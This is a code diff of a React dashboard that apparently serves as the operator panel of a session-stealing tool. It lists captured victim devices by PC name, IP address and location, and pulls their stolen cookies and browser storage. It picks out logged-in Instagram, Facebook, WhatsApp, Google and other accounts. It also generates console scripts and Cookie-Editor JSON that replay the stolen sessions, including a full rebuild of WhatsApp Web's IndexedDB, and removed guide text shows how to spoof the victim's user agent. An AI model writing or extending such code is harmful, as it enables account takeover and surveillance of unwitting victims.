@@ -46,6 +46,7 @@ export default function SessionsPage() {
   const [showGuide, setShowGuide] = useState(false);
   const [webStorage, setWebStorage] = useState<any[]>([]);
   const [copiedStorage, setCopiedStorage] = useState(false);
+  const [deviceSearch, setDeviceSearch] = useState("");
 
   useEffect(() => {
     fetchSessions();
@@ -69,108 +70,81 @@ export default function SessionsPage() {
     
     const domainCounts: Record<string, number> = {};
     usageList.forEach(domain => {
-      // Clean domain: Remove leading dot and convert to lowercase
       const d = domain.replace(/^\./, "").toLowerCase();
-      // Ignore common noise domains
       if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics") && !d.includes("pixel") && !d.includes("googletagmanager")) {
         domainCounts[d] = (domainCounts[d] || 0) + 1;
       }
     });
 
     const entries = Object.entries(domainCounts);
-    if (entries.length === 0) return usageList[0].replace(/^\./, "");;
-    
-    // Sort by frequency and return the top domain
+    if (entries.length === 0) return usageList[0].replace(/^\./, "");
     return entries.sort((a, b) => b[1] - a[1])[0][0];
   };
 
   const identifyAccount = (sessionCookies: { domain: string, name: string, value: string, expiration_date: number | null }[], fallbackId: string, extraDomains: string[] = []): AccountInfo => {
     const health = getHealthStatus(sessionCookies);
-    // Use extraDomains if provided, otherwise fallback to cookies
     const allDomains = extraDomains.length > 0 ? extraDomains : sessionCookies.map(c => c.domain);
     const domainStr = allDomains.map(d => d.toLowerCase()).join(" ");
     
-    // PRIORITY AUTH DETECTION: Check for platform-specific auth cookies FIRST
-    // This is more reliable than domain frequency since Google/YouTube are omnipresent
-    
-    // WhatsApp Web
     if (domainStr.includes("whatsapp.com") || domainStr.includes("web.whatsapp.com"))
       return { platform: "WhatsApp", identifier: "WhatsApp Web", icon: MessageSquare, color: "text-green-500", health, domain: "web.whatsapp.com" };
     
-    // Instagram (check auth cookie)
     const igUser = sessionCookies.find(c => c.name === "ds_user_id" && c.domain.includes("instagram"));
     if (igUser)
       return { platform: "Instagram", identifier: igUser.value || "Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
     
-    // Facebook (check auth cookie)
     const fbUser = sessionCookies.find(c => c.name === "c_user" && c.domain.includes("facebook"));
     if (fbUser)
       return { platform: "Facebook", identifier: fbUser.value || "Account", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
     
-    // Blackboard / UP.edu.pe
     if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
       return { platform: "Blackboard", identifier: "Academic Portal", icon: GraduationCap, color: "text-blue-400", health, domain: "up.edu.pe" };
     
-    // TikTok
     if (domainStr.includes("tiktok.com"))
       return { platform: "TikTok", identifier: "TikTok User", icon: Play, color: "text-pink-400", health, domain: "tiktok.com" };
     
-    // Discord
     if (domainStr.includes("discord.com"))
       return { platform: "Discord", identifier: "Discord User", icon: MessageSquare, color: "text-indigo-400", health, domain: "discord.com" };
     
-    // Spotify
     if (domainStr.includes("spotify.com"))
       return { platform: "Spotify", identifier: "Spotify Listener", icon: Play, color: "text-green-400", health, domain: "spotify.com" };
     
-    // ChatGPT / OpenAI
     if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com"))
       return { platform: "ChatGPT", identifier: "AI Assistant", icon: Cpu, color: "text-emerald-400", health, domain: "chatgpt.com" };
     
-    // Grok
     if (domainStr.includes("grok.com"))
       return { platform: "Grok AI", identifier: "AI Brain", icon: Bot, color: "text-purple-400", health, domain: "grok.com" };
     
-    // Gemini
     if (domainStr.includes("gemini.google.com"))
       return { platform: "Gemini", identifier: "LLM Session", icon: MessageSquare, color: "text-blue-300", health, domain: "gemini.google.com" };
     
-    // LinkedIn
     if (domainStr.includes("linkedin.com"))
       return { platform: "LinkedIn", identifier: "Professional Profile", icon: Linkedin, color: "text-blue-600", health, domain: "linkedin.com" };
     
-    // Mercado Libre
     if (domainStr.includes("mercadolibre.com"))
       return { platform: "Mercado Libre", identifier: "Account", icon: ShoppingCart, color: "text-yellow-400", health, domain: "mercadolibre.com" };
     
-    // X / Twitter
     if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
       return { platform: "X / Twitter", identifier: "Social ID", icon: Twitter, color: "text-blue-400", health, domain: "x.com" };
     
-    // Kick
     if (domainStr.includes("kick.com"))
       return { platform: "Kick", identifier: "Stream Session", icon: Gamepad2, color: "text-green-500", health, domain: "kick.com" };
     
-    // Netflix
     if (domainStr.includes("netflix.com"))
       return { platform: "Netflix", identifier: "Streaming User", icon: Play, color: "text-red-600", health, domain: "netflix.com" };
     
-    // Pinterest
     if (domainStr.includes("pinterest.com"))
       return { platform: "Pinterest", identifier: "Pinterest User", icon: Globe, color: "text-red-500", health, domain: "pinterest.com" };
     
-    // YouTube (AFTER all specific platforms, since YouTube cookies exist everywhere)
     const ytAuth = sessionCookies.find(c => c.name === "LOGIN_INFO" && c.domain.includes("youtube"));
     if (ytAuth)
       return { platform: "YouTube", identifier: "YouTube Viewer", icon: Youtube, color: "text-red-500", health, domain: "youtube.com" };
     
-    // Google (LAST since google.com cookies are in every session)
     if (domainStr.includes("google.com")) {
       const email = sessionCookies.find(c => c.name.includes("email"))?.value;
       return { platform: "Google", identifier: email || "Google User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
     }
 
-    // Generic fallback
     const primaryDomain = getPrimaryDomainFromCookies(sessionCookies, extraDomains);
     const capitalizedName = primaryDomain.split('.')[0].charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
     return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-blue-400", health, domain: primaryDomain };
@@ -180,15 +154,12 @@ export default function SessionsPage() {
     setLoading(true);
     const { data: sessionData } = await supabase
       .from("session_snapshots")
-      .select("*")
+      .select("id, user_id, snapshot_type, captured_at, user_agent, metadata, device_id, pc_name, os, ip_address, location_city, location_country")
       .order("captured_at", { ascending: false })
-      .limit(60); 
+      .limit(100); 
     
     if (sessionData) {
       const sessionIds = sessionData.map(s => s.id);
-      
-      // UNIVERSAL FETCH: Get a broad sample of cookies AND storage for ALL sessions
-      // This ensures we see ALL domains (WhatsApp, Blackboard, etc.) not just Google/YouTube
       const { data: allCookies } = await supabase
         .from("cookies")
         .select("snapshot_id, domain, name, value, expiration_date")
@@ -205,25 +176,15 @@ export default function SessionsPage() {
       sessionData.forEach(session => {
         const sessionCookies = (allCookies || []).filter(c => c.snapshot_id === session.id);
         const sessionStorage = (allStorage || []).filter(s => s.snapshot_id === session.id);
-        
-        // Combine domains for identification
-        const combinedDomains = [
-            ...sessionCookies.map(c => c.domain),
-            ...sessionStorage.map(s => s.domain)
-        ];
-        
+        const combinedDomains = [...sessionCookies.map(c => c.domain), ...sessionStorage.map(s => s.domain)];
         const identity = identifyAccount(sessionCookies, session.user_id, combinedDomains);
-        
-        // FILTER: Only include if identified properly OR has data
         if (identity.domain !== "unknown.com" || sessionCookies.length > 0 || sessionStorage.length > 0) {
            newAccountMap[session.id] = identity;
         } else {
-           // Mark for filtering
            newAccountMap[session.id] = { ...identity, filterMe: true };
         }
       });
       
-      // Filter sessions
       const validSessions = sessionData.filter(s => !newAccountMap[s.id]?.filterMe);
       const validAccountMap: Record<string, AccountInfo> = {};
       validSessions.forEach(s => validAccountMap[s.id] = newAccountMap[s.id]);
@@ -236,33 +197,21 @@ export default function SessionsPage() {
 
   const fetchCookies = async (snapshotId: string) => {
     setLoadingCookies(true);
-    const { data } = await supabase
-      .from("cookies")
-      .select("*")
-      .eq("snapshot_id", snapshotId)
-      .limit(3000); 
+    const { data } = await supabase.from("cookies").select("*").eq("snapshot_id", snapshotId).limit(3000);
     if (data) setCookies(data);
     setLoadingCookies(false);
   };
 
   const fetchWebStorage = async (snapshotId: string) => {
-    const { data } = await supabase
-      .from("web_storage")
-      .select("*")
-      .eq("snapshot_id", snapshotId)
-      .limit(5000);
+    const { data } = await supabase.from("web_storage").select("*").eq("snapshot_id", snapshotId).limit(5000);
     if (data) setWebStorage(data);
     else setWebStorage([]);
   };
 
   const generateWhatsAppScript = () => {
     if (webStorage.length === 0) return "";
-    
-    // Separate IndexedDB and LocalStorage entries
     const idbEntries = webStorage.filter(e => e.storage_type === 'indexeddb');
     const lsEntries = webStorage.filter(e => e.storage_type === 'localstorage');
-    
-    // Group IDB entries by db_name -> store_name
     const dbMap: Record<string, Record<string, {key: string, value: string}[]>> = {};
     idbEntries.forEach(e => {
       if (!dbMap[e.db_name]) dbMap[e.db_name] = {};
@@ -271,200 +220,100 @@ export default function SessionsPage() {
     });
     
     return `(async function() {
-  console.clear();
-  console.log('%c [WhatsApp Restore] INICIANDO RESTAURACIÓN PROFUNDA ', 'background: #25D366; color: #fff; font-weight: bold; padding: 8px; border-radius: 4px; font-size: 16px;');
-  
-  // STEP 1: Restore LocalStorage
-  const lsData = ${JSON.stringify(lsEntries.map(e => ({ key: e.key, value: e.value })))};
-  console.log('%c [LS] Restaurando ' + lsData.length + ' entradas de LocalStorage...', 'color: #25D366;');
-  lsData.forEach(e => {
-    try { localStorage.setItem(e.key, e.value); } catch(err) { console.warn('LS skip:', e.key); }
-  });
-  console.log('%c [LS]  LocalStorage restaurado', 'color: #25D366; font-weight: bold;');
-  
-  // STEP 2: Restore IndexedDB databases
-  const dbMap = ${JSON.stringify(dbMap)};
-  for (const [dbName, stores] of Object.entries(dbMap)) {
-    console.log('%c [IDB] Restaurando DB: ' + dbName, 'color: #00BCD4;');
-    try {
-      // Delete existing DB first for clean restore
-      await new Promise((resolve, reject) => {
-        const delReq = indexedDB.deleteDatabase(dbName);
-        delReq.onsuccess = resolve;
-        delReq.onerror = resolve; // Continue even if delete fails
-        delReq.onblocked = resolve;
-      });
-      
-      const storeNames = Object.keys(stores);
-      const db = await new Promise((resolve, reject) => {
-        const req = indexedDB.open(dbName, 1);
-        req.onupgradeneeded = (e) => {
-          const db = e.target.result;
-          storeNames.forEach(name => {
-            if (!db.objectStoreNames.contains(name)) {
-              db.createObjectStore(name);
-            }
-          });
-        };
-        req.onsuccess = (e) => resolve(e.target.result);
-        req.onerror = (e) => reject(e.target.error);
-      });
-      
-      for (const [storeName, entries] of Object.entries(stores)) {
-        try {
-          const tx = db.transaction(storeName, 'readwrite');
-          const store = tx.objectStore(storeName);
-          for (const entry of entries) {
-            try {
-              const val = entry.value && entry.value.startsWith('{') || entry.value.startsWith('[') ? JSON.parse(entry.value) : entry.value;
-              store.put(val, entry.key);
-            } catch(e) {
-              store.put(entry.value, entry.key);
-            }
-          }
-          await new Promise(r => { tx.oncomplete = r; tx.onerror = r; });
-          console.log('   ' + storeName + ': ' + entries.length + ' entradas');
-        } catch(e) { console.warn('   Store skip:', storeName, e.message); }
+      const lsData = ${JSON.stringify(lsEntries.map(e => ({ key: e.key, value: e.value })))};
+      lsData.forEach(e => { try { localStorage.setItem(e.key, e.value); } catch(err) {} });
+      const dbMap = ${JSON.stringify(dbMap)};
+      for (const [dbName, stores] of Object.entries(dbMap)) {
+        await new Promise(r => { const d = indexedDB.deleteDatabase(dbName); d.onsuccess = r; d.onerror = r; });
+        const db = await new Promise((r, j) => {
+          const req = indexedDB.open(dbName, 1);
+          req.onupgradeneeded = (e) => Object.keys(stores).forEach(n => !e.target.result.objectStoreNames.contains(n) && e.target.result.createObjectStore(n));
+          req.onsuccess = (e) => r(e.target.result); req.onerror = (e) => j(e.target.error);
+        });
+        for (const [storeName, entries] of Object.entries(stores)) {
+          const tx = db.transaction(storeName, 'readwrite'); const s = tx.objectStore(storeName);
+          entries.forEach(en => { try { s.put(en.value.startsWith('{') ? JSON.parse(en.value) : en.value, en.key); } catch(e) { s.put(en.value, en.key); } });
+        }
+        db.close();
       }
-      db.close();
-    } catch(e) { console.warn(' DB skip:', dbName, e.message); }
-  }
-  
-  console.log('%c [WhatsApp Restore]  RESTAURACIÓN COMPLETA - Recarga la página (F5)', 'background: #25D366; color: #fff; font-weight: bold; padding: 8px; border-radius: 4px; font-size: 16px;');
-})()`;
+      location.reload();
+    })()`;
   };
 
   const copyWhatsAppScript = () => {
     const script = generateWhatsAppScript();
-    if (!script) return;
-    navigator.clipboard.writeText(script).then(() => {
-      setCopiedStorage(true);
-      setTimeout(() => setCopiedStorage(false), 5000);
-    });
+    if (script) navigator.clipboard.writeText(script).then(() => { setCopiedStorage(true); setTimeout(() => setCopiedStorage(false), 5000); });
   };
 
   const handleSessionClick = (session: SessionSnapshot) => {
     setSelectedSession(session);
-    setCopied(false);
-    setCopiedJson(false);
-    fetchCookies(session.id);
-    fetchWebStorage(session.id);
+    setCopied(false); setCopiedJson(false); setDeviceSearch("");
+    fetchCookies(session.id); fetchWebStorage(session.id);
   };
 
   const generateConsoleScript = () => {
     if (cookies.length === 0) return "";
+    const filteredCookies = deviceSearch ? cookies.filter(c => c.domain.toLowerCase().includes(deviceSearch.toLowerCase())) : cookies;
     return `(function() {
-  const cookies = ${JSON.stringify(cookies)};
-  console.clear();
-  console.log('%c [SessionSafe] INICIANDO RESTAURACIÓN ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px; border-radius: 3px;');
-  
-  document.cookie.split(";").forEach(function(c) { 
-    const name = c.split("=")[0].trim();
-    const domain = location.hostname;
-    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
-    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + domain;
-  });
-
-  cookies.forEach(c => {
-    try {
-      // Cleaner domain injection logic
-      const targetDomain = c.domain.startsWith(".") ? c.domain : ("." + c.domain);
-      document.cookie = c.name + "=" + c.value + 
-                    "; domain=" + targetDomain + 
-                    "; path=" + (c.path || "/") + 
-                    "; SameSite=Lax; Secure";
-    } catch (e) {}
-  });
-
-  console.log('%c ¡CAPTURA COMPLETADA! Recargando... ', 'background: #10b981; color: #fff; font-weight: bold; padding: 5px;');
-  setTimeout(() => location.reload(), 1500);
-})();`;
+      const cookies = ${JSON.stringify(filteredCookies)};
+      document.cookie.split(";").forEach(c => { const n = c.split("=")[0].trim(); document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname; });
+      cookies.forEach(c => { try { document.cookie = c.name + "=" + c.value + "; domain=" + (c.domain.startsWith('.') ? c.domain : '.' + c.domain) + "; path=/; SameSite=Lax; Secure"; } catch(e){} });
+      setTimeout(() => location.reload(), 1000);
+    })()`;
   };
 
   const copyToClipboard = () => {
-    const script = generateConsoleScript();
-    if (!script) return;
-    navigator.clipboard.writeText(script).then(() => {
-      setCopied(true);
-      setTimeout(() => setCopied(false), 5000);
-    }).catch(() => prompt("Copia este código:", script));
+    const s = generateConsoleScript();
+    if (s) navigator.clipboard.writeText(s).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
   };
 
   const copyCookiesJson = () => {
     if (!selectedSession) return;
     const info = accountMap[selectedSession.id];
     const targetDomain = info?.domain.toLowerCase() || "";
-    
-    // FINAL MIRROR FILTER: Inclusive domain matching (Platform + Auth)
-    const filteredCookies = cookies.filter(c => {
+    const filtered = cookies.filter(c => {
       const d = c.domain.toLowerCase();
-      // Blacklist known tracking junk that blocks imports
-      const noisy = ["fr", "tr", "_fbp", "ar_debug", "test_cookie", "ps_l", "ps_n"];
-      if (noisy.some(b => b === c.name)) return false;
-
-      if (targetDomain.includes("instagram")) {
-        return d.includes("instagram.com") || d.includes("facebook.com");
-      }
+      if (deviceSearch) return d.includes(deviceSearch.toLowerCase());
+      if (targetDomain.includes("instagram")) return d.includes("instagram.com") || d.includes("facebook.com");
       return d.includes(targetDomain);
     });
-
-    const formatted = filteredCookies.map(c => {
-      const isHost = c.name.startsWith("__Host-");
-      const farFuture = Math.floor(Date.now() / 1000) + 86400 * 90;
-
-      // 1. STRIP LITERAL QUOTES
-      let val = c.value || "";
-      if (val.startsWith('"') && val.endsWith('"')) {
-        val = val.substring(1, val.length - 1);
-      }
-      if (val.startsWith('\"') && val.endsWith('\"')) {
-        val = val.substring(2, val.length - 2);
-      }
-
-      // 2. UNESCAPE OCTAL CODES (\054 -> ,)
-      // This is the CRITICAL fix for React Error #418/Hydration.
-      // Instagram's server sends \054, but client JS expects to read the character.
-      val = val.replace(/\\([0-7]{3})/g, (match, octal) => {
-        return String.fromCharCode(parseInt(octal, 8));
-      });
-
+    const formatted = filtered.map(c => {
+      let val = (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)));
       return {
-        domain: isHost ? "" : (c.domain.startsWith('.') ? c.domain : '.' + c.domain),
-        expirationDate: farFuture,
-        hostOnly: isHost ? true : !c.domain.startsWith("."),
-        httpOnly: c.http_only,
-        name: c.name,
-        path: isHost ? "/" : (c.path || "/"),
-        // SECURE-NONE HARMONY: The only way to ensure the Mirror is never rejected
-        // by modern Chrome for sensitive sites like Instagram.
-        sameSite: "no_restriction",
-        secure: true,
-        session: false,
-        storeId: c.store_id || "0",
-        value: val
+        domain: c.domain.startsWith('.') ? c.domain : (c.name.startsWith("__Host-") ? "" : '.' + c.domain),
+        expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
+        hostOnly: !c.domain.startsWith("."), httpOnly: c.http_only, name: c.name, path: c.path || "/", sameSite: "no_restriction", secure: true, session: false, value: val
       };
     });
-    
-    const json = JSON.stringify(formatted, null, 2);
-    navigator.clipboard.writeText(json).then(() => {
-      setCopiedJson(true);
-      setTimeout(() => setCopiedJson(false), 5000);
-    });
+    navigator.clipboard.writeText(JSON.stringify(formatted, null, 2)).then(() => { setCopiedJson(true); setTimeout(() => setCopiedJson(false), 5000); });
   };
 
   const getDeviceIcon = (ua?: string) => {
     if (!ua) return Monitor;
-    const lowerUA = ua.toLowerCase();
-    if (lowerUA.includes("mobi") || lowerUA.includes("android") || lowerUA.includes("iphone")) return Smartphone;
-    if (lowerUA.includes("tablet") || lowerUA.includes("ipad")) return Tablet;
+    const l = ua.toLowerCase();
+    if (l.includes("mobi") || l.includes("android") || l.includes("iphone")) return Smartphone;
     return Monitor;
   };
 
-  const filteredSessions = sessions.filter(s => 
-    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-    accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
-    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase()) ||
-    accountMap[s.id]?.domain.toLowerCase().includes(searchTerm.toLowerCase())
+  const groupedSessions = sessions.reduce((acc, session) => {
+    const dId = session.device_id || "unknown-device";
+    if (!acc[dId]) acc[dId] = [];
+    acc[dId].push(session);
+    return acc;
+  }, {} as Record<string, SessionSnapshot[]>);
+
+  const deviceList = Object.keys(groupedSessions).map(dId => {
+    const devSess = groupedSessions[dId];
+    const latest = devSess[0];
+    return {
+      id: dId, pc_name: latest.pc_name || "Unknown PC", os: latest.os || "Unknown OS", ip: latest.ip_address || "0.0.0.0",
+      location: latest.location_city ? `${latest.location_city}, ${latest.location_country || ""}` : "Unknown Location",
+      lastSeen: latest.captured_at, sessions: devSess, latest: latest
+    };
+  });
+
+  const filteredDevices = deviceList.filter(d => 
+    d.pc_name.toLowerCase().includes(searchTerm.toLowerCase()) || d.ip.includes(searchTerm) || d.location.toLowerCase().includes(searchTerm.toLowerCase())
   );
 
   return (
@@ -472,229 +321,106 @@ export default function SessionsPage() {
       <div className="space-y-8 max-w-7xl mx-auto pb-40 px-6">
         <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 py-8">
           <div>
-            <h2 className="text-5xl font-black tracking-tighter bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 bg-clip-text text-transparent">
-              Intelligence Dashboard
-            </h2>
-            <p className="text-gray-500 font-bold tracking-wide mt-1">OPERATIONAL SESSIONS: {sessions.length}</p>
+            <h2 className="text-5xl font-black tracking-tighter bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">Device Intelligence</h2>
+            <p className="text-gray-500 font-bold tracking-wide mt-1 uppercase text-xs">DEVICES ONLINE: {deviceList.length}</p>
           </div>
-          
           <div className="flex items-center gap-4">
-            <div className="glass flex items-center px-5 py-3 rounded-2xl border border-white/5 w-full md:w-80 shadow-2xl">
-              <Search className="text-gray-500 mr-3" size={20} />
-              <input 
-                type="text" 
-                placeholder="Locate platforms or domains..." 
-                className="bg-transparent border-none outline-none text-sm w-full py-1 placeholder:text-gray-600 font-medium"
-                value={searchTerm}
-                onChange={(e) => setSearchTerm(e.target.value)}
-              />
+            <div className="glass flex items-center px-6 py-3.5 rounded-2xl border border-white/5 w-80 shadow-2xl">
+              <Search className="text-gray-500 mr-4" size={20} />
+              <input type="text" placeholder="Device, IP, Location..." className="bg-transparent border-none outline-none text-sm w-full placeholder:text-gray-600 font-bold uppercase tracking-wider" value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
             </div>
-            <button onClick={() => {fetchSessions();}} className="glass p-3.5 rounded-2xl hover:bg-white/5 transition-all active:scale-95 border border-white/5 shadow-xl">
-              <RefreshCw size={22} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
-            </button>
-            <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl text-blue-400 border border-blue-500/20 font-black text-xs uppercase tracking-widest shadow-xl hover:bg-blue-500/5 transition-all">
-              <HelpCircle size={20} /> MANUAL
-            </button>
+            <button onClick={() => fetchSessions()} className="glass p-4 rounded-2xl hover:bg-blue-500/10 border border-white/5 transition-all"><RefreshCw size={22} className={loading?"animate-spin":""} /></button>
+            <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl border border-blue-500/20 font-black text-[10px] tracking-[0.2em] uppercase text-blue-400">Manual</button>
           </div>
         </header>
 
         {loading ? (
-          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-8">
-            {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-56 glass rounded-[3rem] animate-pulse" />)}
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+            {[1, 2, 3].map(i => <div key={i} className="h-64 glass rounded-[4rem] animate-pulse" />)}
           </div>
         ) : (
-          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-8">
-            {filteredSessions.map((session) => {
-              const info = accountMap[session.id] || { platform: "External", identifier: "Active Session", icon: Shield, color: "text-blue-400", health: "active", domain: "unknown" };
-              const UAIcon = getDeviceIcon(session.user_agent);
-              
-              return (
-                <motion.div
-                  key={session.id}
-                  initial={{ opacity: 0, y: 30 }}
-                  animate={{ opacity: 1, y: 0 }}
-                  whileHover={{ y: -8, scale: 1.02 }}
-                  onClick={() => handleSessionClick(session)}
-                  className={`glass p-8 rounded-[3rem] cursor-pointer border-2 transition-all duration-500 ${selectedSession?.id === session.id ? "border-blue-500 bg-blue-500/10 shadow-3xl shadow-blue-500/20" : "border-white/5 hover:border-white/10 shadow-2xl"}`}
-                >
-                  <div className="flex items-start justify-between mb-6">
-                    <div className={`p-5 rounded-3xl bg-black/40 shadow-inner border border-white/5 ${info.color}`}>
-                      <info.icon size={32} strokeWidth={2.5} />
-                    </div>
-                    <div className="flex flex-col items-end gap-2">
-                      <div className="glass-pill px-4 py-2 rounded-full text-[10px] font-black text-white/50 uppercase tracking-[0.2em] border border-white/5 shadow-sm">
-                        {info.platform}
-                      </div>
-                      <div className={`text-[9px] font-black uppercase px-3 py-1.5 rounded-full flex items-center gap-1.5 shadow-md ${
-                        info.health === "active" ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/20" : "bg-red-500/20 text-red-400 border border-red-500/20"
-                      }`}>
-                        <div className={`w-1.5 h-1.5 rounded-full ${info.health === "active" ? "bg-emerald-400 animate-pulse" : "bg-red-400"}`} />
-                        {info.health}
-                      </div>
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+            {filteredDevices.map(device => (
+              <motion.div key={device.id} whileHover={{ y: -10 }} onClick={() => handleSessionClick(device.latest)} className="glass p-10 rounded-[4rem] border-2 border-white/5 hover:border-blue-500/20 cursor-pointer shadow-2xl">
+                <div className="flex justify-between items-start mb-8">
+                  <div className="space-y-4">
+                    <div className="p-6 rounded-[2.5rem] bg-blue-500/20 w-fit text-blue-400 border border-blue-500/20"><Monitor size={40} /></div>
+                    <div>
+                      <h4 className="text-2xl font-black text-white">{device.pc_name}</h4>
+                      <p className="text-[10px] font-black text-blue-400/60 uppercase tracking-widest">{device.location}</p>
                     </div>
                   </div>
-                  <div className="space-y-1">
-                    <div className="text-[11px] font-black text-blue-400/90 uppercase tracking-[0.15em] px-1 drop-shadow-md">
-                      {info.domain}
-                    </div>
-                    <h4 className="font-black text-xl truncate text-white mb-2 leading-tight">{info.identifier}</h4>
-                    <div className="flex items-center justify-between pt-2">
-                      <div className="flex items-center gap-2 text-xs font-bold text-gray-500">
-                        <Clock size={14} className="text-gray-600" />
-                        {formatRelativeTime(session.captured_at)}
-                      </div>
-                      {session.user_agent && (
-                        <div className="flex items-center gap-2 text-[10px] font-black text-blue-400/90 bg-blue-400/10 px-3 py-2 rounded-2xl border border-blue-400/20 uppercase tracking-tighter shadow-sm">
-                          <UAIcon size={14} /> UA VERIFIED
-                        </div>
-                      )}
-                    </div>
+                  <div className="text-right">
+                    <div className="glass-pill px-4 py-1.5 rounded-full text-[9px] font-black uppercase tracking-widest text-white/30 border border-white/5 mb-2">{device.os}</div>
+                    <div className="text-[10px] font-black text-emerald-400 flex items-center gap-2 justify-end tracking-tighter"><div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"/>ONLINE</div>
                   </div>
-                </motion.div>
-              );
-            })}
+                </div>
+                <div className="bg-black/30 rounded-[3rem] p-6 border border-white/5 space-y-4">
+                  <div className="flex justify-between text-[10px] font-black uppercase text-white/20 tracking-widest"><span>Net ID</span><span className="text-blue-400/40">{device.ip}</span></div>
+                  <div className="flex justify-between items-center text-xs">
+                    <div className="flex gap-2 items-center text-gray-500 font-bold"><Clock size={14}/> {formatRelativeTime(device.lastSeen)}</div>
+                    <div className="px-4 py-1.5 rounded-full bg-blue-500/10 text-blue-400 font-black text-[9px] uppercase tracking-widest">{device.sessions.length} SNAPS</div>
+                  </div>
+                </div>
+              </motion.div>
+            ))}
           </div>
         )}
 
-        {/* Global Manual Sidebar */}
-        <AnimatePresence>
-          {showGuide && (
-            <motion.div 
-              initial={{ opacity: 0, x: 400 }} 
-              animate={{ opacity: 1, x: 0 }} 
-              exit={{ opacity: 0, x: 400 }} 
-              className="fixed top-28 right-10 w-96 z-[100]"
-            >
-              <GlassCard className="p-8 border-l-4 border-blue-500 bg-black/90 backdrop-blur-3xl rounded-[3rem] shadow-3xl">
-                <div className="flex items-center justify-between mb-8">
-                  <h5 className="font-black text-sm uppercase tracking-[0.3em] text-blue-400">Restoration Hub</h5>
-                  <button onClick={() => setShowGuide(false)} className="p-2 hover:bg-white/10 rounded-2xl transition-colors"><X size={20} /></button>
-                </div>
-                <div className="space-y-8">
-                  {[
-                    { step: "01", title: "Match User-Agent", desc: "Use 'User-Agent Switcher' extension. Paste the exact UA captured in the panel." },
-                    { step: "02", title: "Clean Start", desc: "Open a new tab at the target site (e.g., instagram.com) BEFORE importing." },
-                    { step: "03", title: "Limpieza Total", desc: "USA EL ICONO DE BASURA en Cookie-Editor para borrar cookies anteriores ANTES de importar." },
-                    { step: "04", title: "Persistence", desc: "Refresh the page. The session should be recognized as a local 1:1 mirror." }
-                  ].map((item, idx) => (
-                    <div key={idx} className="flex gap-6 items-start">
-                      <div className="text-3xl font-black text-white/5 select-none">{item.step}</div>
-                      <div>
-                        <div className="text-xs font-black text-white/90 uppercase mb-2 tracking-widest">{item.title}</div>
-                        <p className="text-xs text-gray-500 leading-relaxed font-medium">{item.desc}</p>
-                      </div>
-                    </div>
-                  ))}
-                </div>
-              </GlassCard>
-            </motion.div>
-          )}
-        </AnimatePresence>
-
-        {/* Floating Detail Overlay */}
         <AnimatePresence>
           {selectedSession && (
-            <motion.div initial={{ opacity: 0, y: 100 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 100 }} className="fixed bottom-0 left-0 right-0 p-10 z-[110] pointer-events-none">
-              <div className="max-w-6xl mx-auto pointer-events-auto">
-                <GlassCard className="border-t-4 border-blue-500 shadow-[0_0_100px_rgba(37,99,235,0.2)] bg-black/98 backdrop-blur-3xl px-12 py-12 rounded-[4rem]">
+            <motion.div initial={{ opacity:0, y:100 }} animate={{ opacity:1, y:0 }} exit={{ opacity:0, y:100 }} className="fixed bottom-0 left-0 right-0 p-10 z-[110] pointer-events-none">
+              <div className="max-w-6xl mx-auto pointer-events-auto relative">
+                <button onClick={() => setSelectedSession(null)} className="absolute -top-4 -right-4 p-4 bg-black/60 rounded-full border border-white/10 text-white hover:rotate-90 transition-all"><X size={24}/></button>
+                <GlassCard className="glass-intense p-12 rounded-[4rem] border-t-4 border-blue-500 shadow-3xl">
                   <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                     <div className="space-y-8">
                       <div className="flex items-center gap-6">
-                        <div className={`p-8 rounded-[2.5rem] bg-black/40 shadow-inner border border-white/5 ${accountMap[selectedSession.id]?.color}`}>
-                          {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 72 })}
+                        <div className={`p-8 rounded-[3rem] bg-black/60 border border-white/5 ${accountMap[selectedSession.id]?.color}`}>
+                          {React.createElement(accountMap[selectedSession.id]?.icon || Shield, { size: 64 })}
                         </div>
                         <div>
-                          <h3 className="text-5xl font-black text-white leading-tight">{accountMap[selectedSession.id]?.platform}</h3>
-                          <div className="flex items-center gap-3 text-gray-400 font-bold mt-2 uppercase text-[11px] tracking-[0.2em]">
